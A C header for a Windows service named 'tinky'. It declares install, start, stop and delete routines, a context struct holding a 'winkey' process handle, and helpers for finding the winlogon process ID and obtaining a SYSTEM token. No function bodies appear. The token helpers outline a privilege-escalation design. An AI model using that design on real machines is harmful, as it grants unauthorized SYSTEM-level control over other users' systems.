#ifndef SVC_H
#define SVC_H

/* 
    minimal version facor compilator 
    0x0A00 -> windows 10
*/
#define _WIN32_WINNT 0x0A00
#define _WIN32_WINNT_WIN10_TH2  0x0A00 
#define _WIN32_WINNT_WIN10_RS1  0x0A00
#define _WIN32_WINNT_WIN10_RS2  0x0A01
#define _WIN32_WINNT_WIN10_RS3  0x0A02
#define _WIN32_WINNT_WIN10_RS4  0x0A03
#define _WIN32_WINNT_WIN10_RS5  0x0A04
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

#define INSTALL "install"
#define START   "start"
#define STOP    "stop"
#define DEL     "delete"

#define SERVICE_NAME "tinky"

typedef struct s_svc_ctx
{
    SERVICE_STATUS status;              // struct windows state of service
    SERVICE_STATUS_HANDLE hStatus;      // handle id status

    PROCESS_INFORMATION winkey_proc;    // handle process winkey
    HANDLE hStopEvent;                  // event for stop signal
} t_svc_ctx;


// install.c
void    install_svc(char *serviceName, char *pathExe);

// start.c
void    start_svc(char *serviceName);

// stop.c
void    stop_svc(char *serviceName);

// delete.c
void    delete_svc(char *serviceName);

// utils.c
int     is_service_running(char *serviceName);
void    getFilePathFromExe(char *output, char *filename);
DWORD   GetWinLogonPid(DWORD sessionID);
HANDLE  GetSystemToken(void);
void    KillWinkeyPID(void);

// svc.c
void WINAPI ServiceMain(DWORD argc, LPTSTR *argv);

#endif